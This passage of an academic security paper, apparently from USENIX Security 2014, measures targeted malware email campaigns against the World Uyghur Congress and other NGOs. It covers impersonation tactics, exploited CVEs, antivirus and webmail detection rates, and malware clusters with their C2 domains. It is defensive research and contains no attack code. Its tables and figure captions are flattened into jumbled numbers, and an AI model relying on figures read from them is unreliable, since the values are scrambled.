outlook.com, and ya- hoo.com), and veri\ufb01ed via Sender Policy Framework (SPF) and DomainKeys Identi\ufb01ed Mail (DKIM). SPF and DKIM are methods commonly used to authenticate the sending server of an email message. By verifying that these malicious emails originated from well-known webmail servers, we obtain 568 malicious emails whose headers are very unlikely to have been tampered with by the attacker. By repeating our above analysis on these emails only, we obtain 724 unique email addresses and 108 organizations. Other organizations besides WUC include NED (WUC\u2019s main source of funding and it- self funded by the US congress), the New York Times, and US embassies. In summary, while we obtained our dataset from two volunteers working for a single orga- nization, it offers substantial coverage not only of one NGO, but also of those attacks against multiple NGOs in which attackers target more than one organization with the same email. We show the full list of organizations targeted in our dataset in Appendix A.What are targeted attacks? There is no precise de\ufb01ni- tion of targeted attacks. In this paper, we loosely de\ufb01ne these attacks as low-volume, socially engineered com- munication which entices speci\ufb01c victims into installing malware. In the dataset we analyze here, the communi- cation is by email, and the mechanism of exploitation is primarily using malicious archives or documents. A tar- geted victim, in this work, refers to speci\ufb01c individuals, or an organization as a whole. When necessary, we also use the term volunteer(s) to distinguish between our two collaborators and other victims.The terms targeted attacks and Advanced Persistent Threats (or APTs) are often used interchangeably. As this paper focuses on the reconnaissance phase of tar- geted attacks (occurring before a compromise), we can- not measure how long attackers would have remained in control of the targeted systems (i.e., their persistency). As a result, we simply refer to these attacks as targeted attacks, and not APTs, throughout the rest of this pa- per. We discuss speci\ufb01c social engineering characteris- tics that make targeted attacks dif\ufb01cult to detect by un- suspecting average users in Section 3, the attack vectors used in our dataset in Section 4, and the malware fam- ilies they install in Section 5. Finally, we will discuss open research challenges in Section 6.Ethics. The dataset was collected prior to our contact- ing WUC and for the purpose of future security analysis. Furthermore, WUC approved the disclosure of all the in- formation contained in this paper and requested that the organization\u2019s name not be anonymized.USENIX Association23rd USENIX Security Symposium 5453Table 1: Summary of our dataset originating from two volunteers. Malicious indicates the fraction of emails containing malware, Impersonated the fraction of emails with an impersonated sender, # recipients and # orgs the number of unique email addresses that were listed in the To and Cc \ufb01elds of the malicious emails and the corresponding number of organizations, respectively.1st volunteer 2nd volunteerTotalBeginning - endSept 2012 - Sept 2013 Sept 2009 - Jul 2013 Sept 2009 - Sept 2013Size 916 MBMalicious154/241 (64%) 962/1,252 (77%) 1,116/1,493 (75%)Impersonated141/154 (92%) 802/962 (83%) 943/1,116 (84%)# recipients# orgs124 1083 Analysis of social engineeringThe GhostNet, Mandiant, ISTR, and other reports [11, 15, 22] mention the use of socially-engineered emails to lure their victims into installing malware, clicking on malicious links, or opening malicious documents. For example, the GhostNet report refers to one spoofed email containing a malicious DOC attachment, and the Man- diant report to one email sent from a webmail account bearing the name of the company\u2019s CEO enticing several employees to open malware contained in a ZIP archive. Concurrent work reports the use of careful social engi- neering against civilians and NGOs in the Middle East [16] and also Tibetan and human-rights NGOs [10]. De- spite this anecdotal evidence, we are not aware of any rigorous and thorough analysis of the social engineering techniques employed in targeted attacks. In this section, we seek to answer the following questions in the context of our dataset:\u2022 What socialtraits of victims are generally ex- ploited? Do attackers generally impersonate a sender known to the victim and if so who do they choose to impersonate?\u2022 Who are the victims? Are malicious emails sent only to speci\ufb01c individuals, to entire organizations, or communities of users?\u2022 When are users being targeted? When do users start being targeted? Are the same users frequently being targeted and for how long? Are several users from the same organization being targeted simultaneously?3.1 Methodology The analysis below focuses on 1,116 malicious emails received between 2009 and 2013. Topics and language. To attempt to understand how well the attacker knows his victims, we manually catego- rized the emails (coded) by topic and language. (Unlessindicated otherwise, the analysis below was performed on emails that were coded by one of the author.) The topic was determined by reading the emails\u2019 titles and bodies and, in cases where emails were not written in En- glish, we also used an online translation service. Emails whose topic was still unclear after using the translator were labeled as Unknown. Targeted victims. To determine the targeted victims of these attacks, we searched the email addresses and full names of the senders and receivers for the mali- cious emails originating from trustworthy SMTP servers. When available, we used their public pro\ufb01les available on social media websites such as Google, Facebook, and Skype to determine their professional positions and or- ganizations. We assume we have found the social pro\ufb01le of a victim if one of the three following rules applies (in that order): First, if the social pro\ufb01le refers directly to the email address seen in the malicious email; second, if the social pro\ufb01le refers to an organization whose do- main matches the victims\u2019 email address; or third, if we \ufb01nd contextual evidence that the social pro\ufb01le is linked to WUC, Uyghurs, or the topic of the malicious email. Out of 724 victims\u2019 email addresses, we found the pro- \ufb01le of 32% (237), 4% (30), and 23% (167) using the \ufb01rst, second, and last rule, respectively. Organizations and industries. In the following, WUC refers to victims directly af\ufb01liated with the organiza- tion (including our volunteers). Other Uyghur NGOs include Australia, Belgium, Canada, Finland, France, Japan, Netherlands, Norway, Sweden, and UK associa- tions. Other NGOs include non-pro\ufb01t organizations such as Amnesty International, Reporters Without Borders, and Tibetan NGOs. Academia, Politics, and Business contain victims working in these industries. Finally, Un- known corresponds to victims for which we were not able to determine an af\ufb01liation. Ranks. We also translated the professional positions of the victims into one of the three categories: High, Medium, and Low pro\ufb01le. We consider professional lead- ership positions such as chairpersons, presidents, and ex- ecutives as high-pro\ufb01le, job positions such as assistants, and IT personnel as medium-pro\ufb01le, and unknown and shared email addresses (e.g., NGO\u2019s contact informa- tion) as low-pro\ufb01le.546 23rd USENIX Security SymposiumUSENIX Association4sl 48139326575AllTopics of malicious emails WUC85731762012 20132009 2010 2011 2012 2013YearsFigure 2: Distribution of the topics of the malicious emails for each year of the dataset shared by our two volunteers. The left bar corresponds to the data shared by both volunteers, and the next two bar groups to each year of the data shared by our \ufb01rst and second volun- teer, respectively. The content of malicious emails is targeted to the victims.sl 0111652760267AllLanguages of malicious emails 2009 2010 2011 2012 201335YearsFigure 3: Distribution of languages for each year of our dataset. Malicious emails employ the language of their victims.Impersonation. Finally, to understand the social con- text of the attack, each of our volunteers coded (based on her experience within the organization) all the email addresses of the senders into one of \ufb01ve categories: Spoofed, Typo, Name, Suspicious, or Unknown. (Coding was done based exclusively on the personal knowledge of the volunteers.) An email is marked as Spoofed if it bears the exact sender email address of a person known to our volunteers, as Typo if it resembles a sender email address known to the receiver but is not identical, and as Name if the attacker used the full name of a volunteer\u2019s contact (with a different email address). Finally, email addresses that look as if they had been generated by a computer program (e.g., uiow839djs93j@yahoo.com) are labeled as Suspicious and all remaining emails as Un-known. Our assumption is that, because our volunteers received most of the malicious emails directly, they were likely to recognize cases where their contacts were be- ing impersonated. We note that labeling is conservative: Our volunteers may sometimes label Spoofed or Typo ad- dresses as Unknown because they do not know the person impersonated in the attack. This may happen, for exam- ple, in cases where they were not the primary target of the attack (e.g., they appeared in Cc). Limitations. Our dataset originates from WUC and is limited to those victims that were targeted together with that organization. We will see that these victims were of- ten NGOs. As a result, the social engineering techniques observed here may differ from attacks against different entities such as companies, political institutions, or even other NGOs. Despite these limitations, we argue that this analysis is an important \ufb01rst step towards understanding the human factors exploited by targeted attacks.3.2 Results In this subsection, we discuss the results of our analy- sis of the social engineering techniques used in the mali- cious emails. Topics and language. The topic of malicious emails in our dataset can generally be classi\ufb01ed into one of three categories: WUC, Uyghur, and human-rights. In partic- ular, we observed 51% (575) of malicious emails per- taining to WUC, 29% (326) to Uyghurs, 12% (139) to human-rights, and 3% (28) to other topics. In addition, the native language of the victim is often used in the ma- licious emails. In fact, 69% (664) of the emails sent to the second volunteer were written in the Uyghur language, and 62% (96) for the \ufb01rst one. These results indicate that attackers invested signi\ufb01cant effort to tailor the content of the malicious emails to their victims, as we see in Fig- ure 2 and Figure 3. Specialized events. In addition to being on topic, we also observed that emails often referred to speci\ufb01c events that would only be of interest to the targeted victims. Throughout our dataset, we found 46% of events (491) related to organizational events (e.g., conferences). We note that these references are generally much more spe- cialized than those used in typical phishing and other pro\ufb01t-motivated attacks. For example, Figure 1 shows a screenshot of an attack that replayed the announcement of a conference on a very specialized topic. The mali- cious email was edited by the attacker to add that all fees would be covered (probably to raise the target\u2019s interest). Impersonation. We \ufb01nd that attackers used carefully crafted email addresses to impersonate high-pro\ufb01le iden- tities that the victims may directly know. That is, attack- ers used one of the following four techniques to add le- gitimacy to a malicious email: First, 41% (465) of theUSENIX Association23rd USENIX Security Symposium 5475Impersonation techniques 2009 2010 2011 2012 2013YearsFigure 4: Distribution of senders\u2019 impersonation tech- niques for each year of our dataset. Malicious emails spoof the email address of a contact of the volunteers, use a very similar address controlled by the attacker, or a contact\u2019s full name.email addresses have Typos (i.e., the email address re- sembles known sender addresses, but with minor, sub- tle differences). These email addresses are identical to legitimate ones with the exception of a few characters being swapped, replaced, or added in the username. Sec- ond, 12% (134) of the senders\u2019 full names corresponded to existing contacts of the volunteers. Third, we \ufb01nd that most email addresses belonged to well-known email providers \u2014 Google being the most prominent with 58% of all emails using the Gmail or GoogleMail domains, followed by Yahoo with 16%.Fourth, we \ufb01nd that 30% (337) of the sender emails were spoofed (i.e., the email was sent from the address of a person that the volunteer knows). This observation sug- gests that the attacker had knowledge of the victim\u2019s so- cial context, and had either spoofed the email header, or compromised the corresponding email account. To iden- tify a subset of compromised email accounts, we con- sider spoofed emails authenticated by the senders\u2019 do- mains using both SPF and DKIM. To reduce the chances of capturing compromised servers instead of compro- mised accounts, we also consider only well-known, trust- worthy domains such as GMail. This procedure yields malicious emails that were likely sent from the legitimate account of the victims\u2019 contacts. We found that three email accounts belonging to prominent activists, includ- ing two out of 10 of the WUC leaders, were compro- mised and being used to send malicious emails. We have alerted these users and are currently working with them to deploy defenses and more comprehensive monitoring techniques, as we will discuss in Section 6.We show the distributions of malicious emails sent with spoofed, typo, suspicious, or unknown email ad- dresses in Figure 4, and the ranks of the impersonatedRanks of impersonated senderssl 2009 2010 2011 2012 2013YearsFigure 5: Distribution of impersonated senders\u2019 ranks for each year of our dataset. Malicious emails often imper- sonate high-pro\ufb01le individuals.Correlation between topics and languages 2Uyghur Rights Others Unknown TopicsFigure 6: Distribution of languages employed to write about the main topics of malicious emails. There is a strong correlation between malicious emails\u2019 topics and the language in which they are written.senders in Figure 5. (We do not show the correspond- ing ranks for receivers because NGOs generally function with a handful of employees, all playing a key role in the organization.) Targeted victims. For the analysis below, which lever- ages other recipients besides our two volunteers, we fur- ther \ufb01lter emails to keep only those originating from well-known domains (as described in Section 2). Doing this leaves us with 568 malicious emails that are likely to have indeed been sent to all the email addresses in the header. We \ufb01nd that the attacks target more organiza- tions than WUC, including 38 Uyghur NGOs, 28 Other NGOs, as well as 41 Journalistic, Academic, and Polit- ical organizations. (See Appendix A for the complete list of targeted organizations.) Interestingly, we \ufb01nd a strong correlation between the topic of an email and the language in which the email was written, as we show in Figure 6. Our results show that English was more and548 23rd USENIX Security SymposiumUSENIX Association6Summary of Findings. We now revisit the initial ques- tions posed at the beginning of this section. First, we saw that most emails in our dataset pertained to WUC, Uyghurs, or human-rights, were written in the recipi- ent\u2019s mother tongue, and often referred to very special- ized events. We also found that sender impersonation was common and that some email accounts belonging to WUC\u2019s leadership were compromised and used to spread targeted attacks. (We note that many more accounts may be compromised but remain dormant or do not appear as compromised in our dataset.) Second, we showed that numerous NGOs were being targeted simultaneously with WUC and that the specialization of emails var- ied depending on the recipient(s). Finally, we observed that the most targeted victims received several malicious emails every month and that attacks were sprayed over several organizations\u2019 employees.4 Analysis of attack vectorsWe now analyze the techniques used to execute arbitrary code on the victim\u2019s computer. The related work re- ports the use of malicious links, email attachments, and IP tracking services [10, 16]. Whereas ISTR 2013 re- ports that EXE are largely used in targeted attacks, and the Mandiant report that ZIP is the predominant format that they have observed in the last several years, we \ufb01nd that these formats represent 0% and 4% (49) of malicious attachments in our dataset, respectively. Instead, we \ufb01nd RAR archives and malicious documents to be the most common attack vectors. Hypotheses that may explain these discrepancies with the Mandiant report include the tuning of attack vectors to adapt to the defenses mecha- nisms used by different populations of email users (e.g., NGOs vs. corporations); Mandiant\u2019s attacker (APT1), mainly using primitive attack vectors such as archives; and/or Mandiant having excluded more advanced attack vectors, such as documents, from its report. However, in the absence of empirical data on APT1\u2019s attack vectors, we cannot test these hypotheses. In this section, we per- form a quantitative study of the attack vectors employed in our dataset, and also analyze their dynamics. We seek to answer the following questions:\u2022 What attack vectors are being employed against WUC? Do they generally rely only on human fail- ures or also on software vulnerabilities? Do they evolve in time and if so, how quickly do they adapt to new defense mechanisms?\u2022 What is the ef\ufb01cacy of existing countermeasures? As all malicious documents in our dataset used well-known vulnerabilities, would commercial, state-of-the-art defenses have detected all of them?Figure 7: Timeline of attacks, in number of malicious emails per month, against the 60 most targeted victims (our two volunteers\u2019 rows are shaded and the vertical line corresponds to one of our volunteer joining WUC). The Y axis represents victims grouped by organization. ETUE corresponds to the East Turkestan Union in Eu- rope NGO and Others to different organizations. Each of the top 60 victims has been frequently attacked over the last four years and several victims from the same NGOs were attacked simultaneously.more common as the topic became less and less special- ized. We hypothesize that attackers may have sent the same email messages to several recipients with similar interests to reduce the costs involved in manually craft- ing these emails. Timing. Our dataset shows that the same victims were frequently targeted and that several members of the same organization were routinely targeted simultane- ously. This suggests that attackers were using a \u201cspray\u201d strategy, trying to \ufb01nd the weakest links in the targeted organization, and hence, optimizing their chance of suc- cess. Spraying is clearly visible in Figure 7 where we see that the top 60 most targeted victims in our dataset received malicious emails often over the last four years. (We note that the dataset shared by one of our volun- teers starts on August 2012, explaining why we observe more malicious emails after that date.) We also see that, 31 email accounts from individuals without af\ufb01liation to WUC were often targeted simultaneously to the WUC accounts.USENIX Association23rd USENIX Security Symposium 5497Targeted vulnerabilitiesUnknown 2009\u2212092010\u2212092011\u221209Time2012\u2212092013\u2212090 2009\u2212092010\u2212092011\u221209Time2012\u2212092013\u221209Figure 8: Number of malicious documents containing a given vulnerability (CVE) (left) and target application (right) for each month of our dataset. We represent the top four CVEs in number of attacks over the whole trace individu- ally and others are represented in aggregate. The vertical line in November 2010 corresponds to the deployment of sandboxing in Acrobat Reader. Although Acrobat Reader was the most targeted application until 2010, recent attacks mainly target the Of\ufb01ce suite. 4.1 Methodology Malicious archives. To analyze the archives\u2019 contents, we extracted them in a disconnected VM environment and manually inspected their contents to determine the type of \ufb01les they contain, independently of their exten- sions. In the case of EXE \ufb01les, we also examined them manually to determine whether their Microsoft Windows icons were similar to those used for other \ufb01le formats (e.g., JPEG) in order to persuade average users that they were not executable. Malicious documents. We used two methodologies to determine the characteristics of the vulnerabilities being exploited by malicious documents. First, we submitted the documents to VirusTotal [1] for analysis. Each of the 45 Antivirus (AVs) on VirusTotal classi\ufb01ed the checked sample as benign or malicious, and attached a \u201ctag\u201d de- scribing the auxiliary information relating to the sample. Often the tag is a Common Vulnerabilities and Exposures (CVE) number, presumably corresponding to the signa- ture that matched, but in some cases, the tag \ufb01eld is not a CVE; it is either tagged as \u201cunknown\u201d or contains a symptomatic description such as the inclusion of a sus- picious OLE object. We refer to these three tags as CVE, Unknown, and Heuristic, respectively. Often all AVs re- ported a Single CVE but sometimes, they reported Mul- tiple, con\ufb02icting CVEs. Once we collected all CVE tags, we then scraped the National Vulnerability Database [18] to obtain the release date and vulnerable applications for each of the CVEs that we found.our taint-assisted manual analysis are described in Ap- pendix B. Defenses. We performed a retrospective analysis of the protection offered by common defenses such as AV and webmail providers in the context of our malicious docu- ments. For AV, we used VirusTotal to determine whether a malicious document is detected by the scanning engine of each AV, as described above. For webmail channels, we created an email account on GMail, Hotmail, and Ya- hoo, and used a dedicated SMTP server to send emails to that account with malicious documents attached. We considered malicious documents delivered without mod- i\ufb01cations as undetected by the webmail defenses. Oth- erwise, if an email or its attachment is dropped, or if the attachment\u2019s payload is modi\ufb01ed, we considered it as de- tected. The analyses based on webmails and VirusTotal were performed in November 2013 and July 2014, re- spectively. Limitations. As with social engineering, our analysis of attack vectors is biased towards NGOs. In addition, the above methodology is limited to the attack vectors captured in our dataset. For example, we miss attacks against the NGOs\u2019 web servers unless the corresponding malicious link appears in the suspicious emails.Second, we inspected the documents manually to con- \ufb01rm that they contain malware, and also used taint- assisted analysis both to verify the accuracy of the CVEs reported in AV reports and to investigate the presence of zero-day vulnerabilities.1 The methodological details ofSecond, our taint-assisted analysis of vulnerabilities is limited to those documents for which we were able to analyze the logs manually. For example, we found that opening PDF \ufb01les in our environment generated log \ufb01les that were far too large (around 15GB in the median case) for manual analysis. As a result, we were able to man- ually con\ufb01rm vulnerabilities only against Microsoft Of- \ufb01ce. However, despite this limitation, we were also able to determine which PDF documents contained malware through manual inspection.1Hereafter, zero-day vulnerabilities refer to vulnerabilities that werenot publicly disclosed at the time of the attack.550 23rd USENIX Security SymposiumUSENIX Association8Table 2: List of well-known vulnerabilities exploited by malicious documents. Release corresponds to the release date of the vulnerability and First to its \ufb01rst exploitation in our data set (in number of days relative to the release date). Resolved corresponds to the number of Microsoft Of\ufb01ce vulnerabilities that were mistagged in AV reports but that we were able to resolve using taint-assisted man- ual analysis.CVERelease FirstApps 2006-0022 06/13/06 1,191 Of\ufb01ce 2006-2389 07/11/06 1,166 Of\ufb01ce 2006-2492 05/20/06 1,125 Of\ufb01ce 588 Acrobat 2007-5659 02/12/08 2008-0081 01/16/08 651 Of\ufb01ce 2008-0118 03/11/08 1,010 Of\ufb01ce 824 Of\ufb01ce 2008-4841 12/10/08 405 Of\ufb01ce 2009-0557 06/10/09 880 Of\ufb01ce 2009-0563 06/10/09 2009-0927 03/19/09 2009-1862 07/23/09 188 Of\ufb01ce 2009-3129 11/11/09 4 2009-4324 12/15/09 Acrobat 2010-0188 02/22/10 2010-1297 06/08/10 2010-2883 09/09/10 2010-3333 11/10/10 0 2010-3654 10/29/10 Of\ufb01ce 2011-0611 04/13/11 2011-0097 04/13/11 2011-2462 12/07/11 37 2012-0158 04/10/12 Of\ufb01ce 2013-0640 02/14/13 68 Acrobat# emails Resolved2 0Finally, our defense analysis was performed in bulk, after the time of the attacks. As a result of the difference between the times of attack and analysis (up to four years for the \ufb01rst malicious documents), the detection rates re- ported hereafter should be treated as upper bounds. This is because the AV signatures at the time of the analysis were more up-to-date than they would have been at the time of the attack. 4.2 Results: Attack vectors 4.2.1 Malicious archives We observed numerous targeted attacks leveraging social engineering and human failure to install malware on the victim\u2019s computer. In particular, we found 247 RAR and 49 ZIP containing malicious EXE. In 10 cases, the ma- licious archives were password protected with the pass- word included in the email\u2019s body. We hypothesize that archiving was used as a rudimentary form of packer for the malware to evade detection by the distribution chan- nels. Finally, we found that 20% of all EXEs contained in the archives used an icon that resembled a non-EXE, i.e., a DOC, JPEG, or PDF icon, in 20%, 19%, and 7% of the cases.2006\u22120022 2010\u22123654day 012 3 Time (years)1\u22125 Acrobat6\u221210 Office4>105Figure 9: Timeline of the target vulnerabilities. The Y axis corresponds to CVEs and each circle to the number of CVEs seen each month after the public disclosure of the vulnerability (day 0). All vulnerabilities were \ufb01rst targeted after their public disclosure.4.2.2 Malicious documentsWe used taint-assisted analysis to resolve the con\ufb02icts due to AV mistagging and summarize the CVE informa- tion in Table 2. The number of con\ufb02icts resolved using taint-assisted manual analysis is reported in the last col- umn Resolved. Additional taint-analysis results are re- ported in Appendix B. Zero-day versus unpatched vulnerabilities. We \ufb01nd no evidence of the use of zero-day vulnerabilities against our dataset, but several uses of disclosed vulnerabilities within the same week as their public release date. In addition, we see in Figure 9 that vulnerabilities continued to be exploited for years after their disclosure, and this con\ufb01rms that unpatched vulnerabilities represent a large fraction of attacks in our dataset. To ascertain the CVE being exploited in each sample, we used a combination of the telemetry data available in CVE tags generated by AVs, and a manual analysis to resolve cases where the tag was ambiguous. For each sample, we then recover the public disclosure date for the vulnerability manually, and treat it as the corresponding day-zero. By comparing the time of use in our email dataset, we are able to ascertain the lifetime of vulnerability exploits.We \ufb01nd several instances of exploits that were used in publicly-reported targeted attacks in our dataset. ForUSENIX Association23rd USENIX Security Symposium 5519te McAfee\u2212GW\u2212Edition NormanFigure 10: Detection rates of popular webmails for the malicious documents. The ef\ufb01cacy of webmails to de- tect malicious documents varies widely.instance, vulnerabilities such as CVE-2009-4324, CVE- 2010-3654, and CVE-2010-2883 have been reported to be zero-day vulnerabilities [6]. However, in our dataset, these vulnerabilities were used after their disclosure. Evolution of target applications. Our data shows a sudden switch from Adobe Reader to Microsoft Of\ufb01ce suite as the primary targeted application as of Novem- ber 2010, as seen in Figure 8. We \ufb01nd a correlation be- tween the time of this switch and two events: (a) the de- ployment of sandboxing defenses in Adobe Reader and (b) the disclosure of vulnerabilities in the Of\ufb01ce suite. The \ufb01rst version of Acrobat Reader to support sandbox- ing for Windows (version 10.0) was released on Novem- ber 15, 2010. Within the same month, a stack buffer over\ufb02ow against Microsoft Of\ufb01ce was released publicly (November 2010), reported as CVE-2010-3333. We see this CVE being massively exploited in our dataset as of January 2011, which is a time lag of two months. We observe the use of CVE-2010-3333 being replaced with CVE-2012-0158 in January 2013. This evidence sug- gests that attackers adapted their targeted vectors to use newly disclosed vulnerabilities within a few days to a few months of disclosure, and that updates to the security de- sign of software reduces its exploitability in the wild (as one would expect).4.3 Results: Bypassing common defenses We now investigate the ef\ufb01cacy of existing defenses against malicious documents. Email / Webmail Filtering. Despite the retrospective analysis of the malicious documents, we \ufb01nd that the detection rates of malicious documents for GMail, Hot- mail, and Yahoo were still relatively low (see Figure 10). We also \ufb01nd that GMail failed to detect most malicious documents sent after March 2012. In particular, while the detection of documents sent before March 2012 wasFigure 11: Detection rates of malicious documents for each of the top 30 AVs as reported by VirusTotal. No sin- gle AV detected all malicious documents despite their use of well-known vulnerabilities.73%, it is 28% after that date. Interestingly, 71% of the true positives for GMail after March 2012 corresponded to RTF \ufb01les with all \\r\\n character sequences substituted with the \\n character. While this substitution did not de- activate the malware, we observed that it broke the shell- codes embedded into these documents as they require the document size to remain unchanged to function properly. As a result, the malware was never executed. Although we cannot verify the purpose of this substitution, we note that its appearance coincided with that of the malicious RTF \ufb01les. We conclude this discussion by pointing out that Yahoo\u2019s low detection rate is interesting as it claims to be using Symantec AV for its webmail service [12] \u2014 which, as we will see below, has a much higher detection rate. Signature-based AV Scanning. In Figure 11, we show the detection rates for the top 30 VirusTotal AVs, sorted by decreasing detection rate of the malicious documents. There are two main takeaways from this graph. First, no single vendor detected all original malicious docu- ments, even though we have seen that they used well- known vulnerabilities. For example, Qihoo, the vendor with the overall best ef\ufb01cacy, was unable to detect 3% of the malicious documents based on scanning. Second, we observe large variations among the ef\ufb01cacy of different AV vendors. That is, the detection rate dropped by 30% from the \ufb01rst to the twentieth AV (CAT QuickHeal) and the 15 AVs with the lowest detection rate (not shown) all had a detection rate of less than 35%. Summary of Findings. We found that malicious docu- ments are the most popular attack vectors in our dataset followed by malicious archives. Malicious documents tended to use newly released vulnerabilities, often within552 23rd USENIX Security SymposiumUSENIX Association10Table 3: Summary of the malware clusters. For each cluster, we show the malware family (or an ID if we could not determine it), the number of malicious emails containing the malware, the number of Command and Control (C2) servers, the similarities in terms of communication protocols and C2 with malware attributed to known entities (entity(Com,C2)). Our dataset contains several families of \ufb01rst-stage malware previously seen in targeted attacks carried out in the wild.Clusters # samples# C2Similarity DTL(C2)1267 (9%)658 (8%)2 \u2014Surtr 51 (7%)6DTL(C2)45678937 (5%)18 \u201430 (4%)13 \u201422 (3%)3 \u201419 (2%)8 \u201419 (2%)13 \u201418 (2%)9 \u2014TravNet 13 (2%)4TravNet(Com,C2)a week, continued to utilize them for several years, and most of them used well-known instead of zero-day vul- nerabilities. In particular, our taint-assisted manual anal- ysis of Of\ufb01ce documents did not reveal a single zero- day vulnerability in our dataset. This raises the ques- tion of whether defense mechanisms deployed in web- mails and state-of-the-art commercial defenses are effec- tive in blocking these well-known attacks. Furthermore, we found that malicious archives often contained EXE \ufb01les that masquerade as pictures or documents.5 Malware analysisWe now analyze the \ufb01rst-stage malware found in ma- licious documents. Unlike the Mandiant report, which provides an analysis for malware that targets different organizations and that (they claim) originates from the same group, our analysis focuses on all malware (in our dataset) that has targeted a single organization. By look- ing at targeted attacks from the perspective of the target rather than the attacker, our analysis enables us to de- termine whether WUC has been targeted with the same or different malware over the years. We also take a dif- ferent approach from the authors of the GhostNet report who performed malware analysis on a few compromised systems belonging to different but related organizations. We instead analyze over six hundred malware samples used to establish a foothold on the targeted systems of a single organization. Our analysis differs from the related work in its scale and context [16] or focus [10]. This section aims to answer the following question:\u2022 Is WUC targeted with the same or different mal- ware? In the latter case, are there similarities be- tween this \ufb01rst-stage malware and others found in targeted attacks in the wild?5.1 Methodology Our analysis below was done on 689 malware samples that we extracted from malicious documents. Clustering. To make our analysis tractable for 689 malware samples, we started by clustering the malwarebased on its behavior. To do so, we ran the malicious EXE and DLL \ufb01les in a disconnected sandboxed envi- ronment and hooked the function calls to resolve domain names and establish network communications. In ad- dition, to obtain the TCP port number on which com- munication is done, we intercepted function calls to gethostbyname and returned a dummy routable IP ad- dress. As a result, the malware subsequently reveals the port number when it initiates a connection with the re- turned IP. (See Appendix C for the complete list of Com- mand and Control (C2) domains.) Finally, we generated behavioral pro\ufb01les for 586 samples, clustered them using an approach similar to [5, 14], and manually veri\ufb01ed the accuracy of the resulting clusters. Malware family and similarities. Similarly to Bailey et al. [5], we found that determining the malware fam- ily using AV signature scanning was unproductive. To determine whether our malware shares similarities with other known targeted malware, we relied on several re- ports on targeted attacks [9,13]. We extracted the C2 do- mains and, when available, additional information about the malware (e.g., hashes and behavior) from these re- ports. Finally, we correlated the domains, IP addresses, hashes, and behavioral pro\ufb01les with those from the re- ports in order to \ufb01nd similarities between the different sets of malware. We performed this analysis in February 2014. Limitations. Our behavioral analysis was performed in a disconnected environment and as a result, it is limited to the \ufb01rst stage of the malware behavior. Studying the be- havior of additional payload that would be downloaded after the compromise is beyond the scope of this paper and will be the subject of future work.5.2 Results We now analyze the malware clusters and their similari- ties with other targeted malware found in the wild. Cluster sizes. We \ufb01nd that 57% of our malware be- longed to the ten largest clusters (we show additional information about these clusters in Table 3). In total, \ufb01ve clusters (two in the top ten) used at least one of dtl6.mooo.com, dtl.dnsd.me, or dtl.eatuo.com as theirUSENIX Association23rd USENIX Security Symposium 55311C2 domains, indicating some operational link between them. In fact, at the time of analysis, these three do- mains resolved into the same IP address and the mal- ware in each cluster connected to different ports of the same server. Despite these apparent similarities, how- ever, manual analysis of the behavioral logs revealed that their logic differed from one another, explaining their as- signment to different clusters. Combined, these \ufb01ve clus- ters represented 24% of the malware that we analyzed.Malware family and similarities. We found various de- grees of similarities between our clusters and targeted at- tacks reported in the wild. First, the \ufb01ve clusters above had the same C2 as the DTL group reported by FireEye in November 2013 and that the malware was of the same family as one of these clusters\u2019 (APT.9002, not shown) [9]. In particular, we found that one of our samples in that cluster had the same MD5 hash as those described in the FireEye report and that eight had identical mani- fest resources. FireEye claims that this malware has been used in targeted attacks against various governmental and industrial organizations.Second, malware in the Surtr cluster had the same be- havioral pro\ufb01le as samples used against the Tibetan com- munity in March 2012 [7]. Although the two sets of sam- ples had different MD5 hashes, they both connected to the same C2 server (shared with APT.9002) on the same port number, and exhibited the same behavior to estab- lish persistency on the victim\u2019s machine.Third, our 13 TravNet samples exhibited similar be- havior as those used against Indian targets in 2013 [2]. To do so, we obtained the samples used in India, generated their behavioral pro\ufb01les, and compared them manually with the malware in our TravNet cluster. Although both sets connected to different C2 servers and exhibited vari- ations in the way they searched the victims\u2019 \ufb01le system, we found that they both used the same communication protocol with the C2.Fourth, samples in another cluster communicated with the same C2 server and exhibited the same behavior as a Vidgrab sample found in a malicious document sent to a victim in Hong Kong in August 2013 [8].Summary of \ufb01ndings. We found that WUC has been targeted with several malware families in the last year. We also showed that the Surtr and APT.9002 clusters corresponded to malware that Citizenlab and FireEye identi\ufb01ed as having targeted the Tibetan community, as well as other political and industrial organizations [7, 9]. Furthermore, 24% of our malware (including Surtr, APT.9002 and three other clusters) had at least one C2 domain in common, which was identical to those of the Citizenlab and FireEye reports.6 Future WorkSeveral directions for future work arise from this work. We brie\ufb02y discuss them below. Attack vectors and generalization. Our analysis is limited to attack vectors used against WUC. Similar stud- ies on a wider range of targets would bene\ufb01t understand- ing this emerging threat better. Further, our attack vec- tors distributed over email channels and have two main limitations. First, it is possible that our volunteers have been attacked via other channels besides email. Sec- ond, although we have seen various organizations tar- geted with the same malware as WUC, it is generally hard to determine with certainty which victims were the primary target of these attacks. Therefore, it is possi- ble that other victims have been targeted with additional attack vectors when the attacks did not involve WUC. Further research is needed to overcome these limitations Exploring different channels that attackers use for dis- tributing malicious payloads is important. As a step to- wards this goal, we are currently collaborating with the Safebrowsing team at Google to investigate the emer- gent threat of watering-hole attacks. These attacks are conceptually very similar to drive-by download attacks with one key difference: They compromise very speci\ufb01c websites commonly visited by the targeted community (e.g., a company\u2019s website) and wait for victims to visit the website. As compared to spear phishing, watering- hole attacks offer the advantage of potentially targeting a fairly large number of victims (e.g., all employees of a large company) before raising suspicion. We conjecture that the small number of suspicious links in our dataset may be due to the small size of the targeted organizations and the public availability of their employees\u2019 email ad- dresses.Other attack vectors include but are not limited to packets injection to redirect victims to malicious servers (similar to those used in watering-hole attacks) and phys- ical attacks on the victims\u2019 devices [3]. Detecting these attacks would require completely different methodolo- gies than the one we used in this paper. Monitoring. We have seen that a few high-pro\ufb01le mem- bers of the Uyghur community were compromised and that their email accounts were being used as stepping stones to carry out targeted attacks. Although it is possi- ble that these email accounts were compromised via tar- geted attacks, we have not yet con\ufb01rmed this hypothesis. More generally, we do not know yet what is the speci\ufb01c aim of these targeted attacks. Monitoring the full lifecy- cle of targeted attacks would require novel measurement systems, deployed at the end users, that can identify com- promises without being detected.Pinpointing the geolocation of attackers carrying out targeted attacks, or attack attribution, is another open554 23rd USENIX Security SymposiumUSENIX Association12monitoring challenge. Marczak et al. were able to at- tribute targeted attacks to governments in the Middle East by analyzing relationships of cause and effect be- tween compromises and real-world consequences [16]. In contrast to monitoring and attack attribution, this pa- per has presented a extensive, complementary analysis of the life cycle of targeted attacks before the compromise. Large-scale malware analysis and clustering. We found it challenging to (a) cluster targeted malware and (b) locate similar samples. First, this malware sometimes exhibits signi\ufb01cant similarity in its logic and different malware may also 